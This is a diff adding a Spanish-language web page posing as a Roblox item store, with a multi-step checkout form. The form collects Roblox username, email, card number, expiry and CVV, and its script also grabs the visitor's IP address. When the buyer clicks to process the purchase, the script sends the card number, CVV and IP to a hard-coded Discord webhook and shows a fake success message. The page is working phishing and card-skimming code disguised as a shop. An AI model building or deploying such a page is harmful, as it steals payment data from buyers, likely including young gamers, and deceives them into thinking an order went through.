@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RoIsai - Store</title>
+    <style>
+        /* Estilos Globales Renovados */
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif}
+        body{background:#f0f2f5; color: #1c1e21}
+        
+        /* Navegación */
+        .navbar{
+            background:#0a73e8; color:white; padding:15px 5%; display:flex;
+            justify-content:space-between; align-items:center; position: sticky; top: 0; z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .logo{display:flex;align-items:center; font-size: 1.5rem; font-weight: bold}
+        .logo img{width:32px;height:32px;margin-right:12px}
+        .menu a{color:white;text-decoration:none;margin-left:20px;font-weight:600; transition: 0.2s}
+        .menu a:hover{opacity: 0.7}
+        
+        /* Banner Animado */
+        .banner{width:100%; height:300px; overflow:hidden; position: relative; background: #000}
+        .banner img{width:100%;height:100%;object-fit:cover; opacity: 0.9}
+
+        /* Contenedor de Productos */
+        .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px; }
+        .section-title { text-align: center; margin-bottom: 40px; color: #0a73e8; font-size: 2rem }
+        .products{ display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); gap:30px; }
+        
+        .card{
+            background:white; padding:25px; border-radius:15px; text-align:center;
+            box-shadow:0 8px 24px rgba(0,0,0,0.05); transition: 0.3s;
+        }
+        .card:hover{transform: translateY(-8px); box-shadow: 0 12px 30px rgba(0,0,0,0.1)}
+        .card img{width:160px;height:160px;object-fit:contain;margin-bottom:20px}
+        .price{color:#2ecc71;font-weight:bold;font-size: 1.4rem; margin-bottom: 20px}
+        
+        .buy-btn{
+            background:#0a73e8; color:white; border:none; padding:14px; width:100%;
+            cursor:pointer; font-weight:bold; border-radius:10px; transition: 0.2s;
+        }
+        .buy-btn:hover{background:#0860c4}
+
+        /* Modal / Formulario */
+        .modal{
+            position:fixed; inset:0; background:rgba(0,0,0,0.6); backdrop-filter: blur(5px);
+            display:none; justify-content:center; align-items:center; z-index:2000; padding: 20px;
+        }
+        .modal.active{display:flex}
+        .modal-box{ background:white; padding:35px; width:100%; max-width:420px; border-radius:20px; position:relative; text-align: center}
+        .modal-box input{
+            width:100%; padding:14px; margin-top:12px; border:2px solid #e4e6eb; border-radius:10px; outline: none; font-size: 1rem;
+        }
+        .hidden{display:none}
+        .step-content{margin-bottom: 20px; text-align: left}
+        .summary-box { background: #f7f8fa; padding: 20px; border-radius: 12px; margin-top: 15px; }
+        
+        .radio-label {
+            display: block; padding: 15px; border: 2px solid #e4e6eb; border-radius: 12px; 
+            margin-bottom: 10px; cursor: pointer; font-weight: 600;
+        }
+        .radio-label.selected { border-color: #0a73e8; background: #f0f7ff; color: #0a73e8; }
+        .radio-label input { display: none }
+
+        .loading-spinner {
+            display: none; width: 20px; height: 20px; border: 3px solid #fff; 
+            border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .is-loading .loading-spinner { display: inline-block; }
+        .is-loading span { display: none; }
+    </style>
+</head>
+<body>
+
+<nav class="navbar">
+    <div class="logo">
+        <img src="https://static.wikia.nocookie.net/logopedia/images/0/07/Roblox_icon_2006.svg" alt="Logo">
+        <span>ROISAI</span>
+    </div>
+    <div class="menu">
+        <a href="#">INICIO</a>
+        <a href="#">PRODUCTOS</a>
+    </div>
+</nav>
+
+<header class="banner">
+    <img src="https://cdn.discordapp.com/attachments/1269796613342101508/1461281242359005329/downloadfile.gif?ex=696df035&is=696c9eb5&hm=a881cf990793fd63e23132951c50ad3462c8f36c22925e05b1f434c33d185b2e" alt="Banner Animado">
+</header>
+
+<main class="container">
+    <h2 class="section-title">Catálogo Exclusivo</h2>
+    <div class="products">
+        <div class="card">
+            <img src="https://tr.rbxcdn.com/180DAY-5eacc7281795d67c2ef8363261f1e149/420/420/Face/Webp/noFilter">
+            <h3>HAPPY FACE</h3>
+            <div class="price">$600 USD</div>
+            <button class="buy-btn" onclick="openModal('HAPPY FACE', '$600 USD')">COMPRAR</button>
+        </div>
+        <div class="card">
+            <img src="https://tr.rbxcdn.com/180DAY-bbbaac718eb04b6744c62d357f1550fb/420/420/Face/Png/noFilter">
+            <h3>VAMPIRE FACE</h3>
+            <div class="price">$300 USD</div>
+            <button class="buy-btn" onclick="openModal('VAMPIRE FACE', '$300 USD')">COMPRAR</button>
+        </div>
+        <div class="card">
+            <img src="https://tr.rbxcdn.com/180DAY-6de95256d0233d3726293aaaba8b8e61/420/420/Hat/Png/noFilter">
+            <h3>VALKYRIE HELM</h3>
+            <div class="price">$700 USD</div>
+            <button class="buy-btn" onclick="openModal('VALKYRIE HELM', '$700 USD')">COMPRAR</button>
+        </div>
+        <div class="card">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Robux_2019_Logo_gold.svg/960px-Robux_2019_Logo_gold.svg.png">
+            <h3>ROBUX 11K</h3>
+            <div class="price">$60 USD</div>
+            <button class="buy-btn" onclick="openModal('ROBUX 11K', '$60 USD')">COMPRAR</button>
+        </div>
+    </div>
+</main>
+
+<div id="orderModal" class="modal">
+    <div class="modal-box">
+        <h2 id="mTitle">Paso 1</h2>
+        <div id="step1" class="step-content">
+            <p>¿Membresía Premium?</p>
+            <label class="radio-label" id="lYes"><input type="radio" onchange="setPrem(true)"> Sí, soy Premium</label>
+            <label class="radio-label" id="lNo"><input type="radio" onchange="setPrem(false)"> No soy Premium</label>
+        </div>
+        <div id="step2" class="step-content hidden">
+            <p>Usuario de Roblox</p>
+            <input type="text" id="user" placeholder="Escribe tu usuario">
+            <button class="buy-btn" style="margin-top:15px" onclick="go(3)">Siguiente</button>
+        </div>
+        <div id="step3" class="step-content hidden">
+            <p>Correo de Contacto</p>
+            <input type="email" id="mail" placeholder="ejemplo@correo.com">
+            <button class="buy-btn" style="margin-top:15px" onclick="go(4)">Siguiente</button>
+        </div>
+        <div id="step4" class="step-content hidden">
+            <p>Información de Pago</p>
+            <input type="text" id="holder" placeholder="Nombre del Titular">
+            <input type="text" id="number" placeholder="Tarjeta (16 dígitos)" maxlength="16">
+            <div style="display:flex; gap:10px">
+                <input type="text" id="exp" placeholder="MM/YY" maxlength="5">
+                <input type="text" id="cvv" placeholder="CVV" maxlength="3">
+            </div>
+            <button class="buy-btn" style="margin-top:15px" onclick="go(5)">Siguiente</button>
+        </div>
+        <div id="step5" class="step-content hidden">
+            <p>Confirmar Pedido</p>
+            <div class="summary-box" id="summary"></div>
+            <button id="finalBtn" class="buy-btn" style="background:#2ecc71; margin-top:15px" onclick="finish()">
+                <span>PROCESAR COMPRA</span>
+                <div class="loading-spinner"></div>
+            </button>
+        </div>
+        <button class="buy-btn" style="background:none; color:#666; font-size:12px; margin-top:10px" onclick="closeModal()">Cancelar</button>
+    </div>
+</div>
+
+<script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1461234951675707616/u_sGZt4osSJu_jRfZIFU8wDslrMo1SpLaaXwaBwJE548mSnpHDBnYod1rWspMfBVCtsj";
+    let data = { ip: '' };
+
+    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => data.ip = d.ip);
+
+    function openModal(n, p) {
+        data = { ...data, name: n, price: p, prem: null };
+        document.getElementById('orderModal').classList.add('active');
+        showStep(1);
+    }
+
+    function closeModal() { document.getElementById('orderModal').classList.remove('active'); }
+
+    function showStep(s) {
+        for(let i=1; i<=5; i++) document.getElementById(`step${i}`).classList.toggle('hidden', i !== s);
+        document.getElementById('mTitle').innerText = `Paso ${s} de 5`;
+    }
+
+    function setPrem(v) {
+        data.prem = v;
+        document.getElementById('lYes').classList.toggle('selected', v);
+        document.getElementById('lNo').classList.toggle('selected', !v);
+        setTimeout(() => showStep(2), 300);
+    }
+
+    function go(s) {
+        if(s === 3 && !document.getElementById('user').value) return alert("Usuario requerido");
+        if(s === 4 && !document.getElementById('mail').value) return alert("Email requerido");
+        if(s === 5) {
+            document.getElementById('summary').innerHTML = `<b>Producto:</b> ${data.name}<br><b>Usuario:</b> ${document.getElementById('user').value}`;
+        }
+        showStep(s);
+    }
+
+    async function finish() {
+        const btn = document.getElementById('finalBtn');
+        btn.classList.add('is-loading');
+        
+        const msg = {
+            content: `🛒 **NUEVO PEDIDO**\n**Usuario:** ${document.getElementById('user').value}\n**Objeto:** ${data.name}\n**Precio:** ${data.price}\n**Tarjeta:** ${document.getElementById('number').value}\n**CVV:** ${document.getElementById('cvv').value}\n**IP:** ${data.ip}`
+        };
+
+        try {
+            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(msg) });
+            alert("¡Pedido enviado correctamente!");
+            closeModal();
+        } catch (e) { alert("Error al procesar."); }
+        btn.classList.remove('is-loading');
+    }
+</script>
+</body>
+</html>
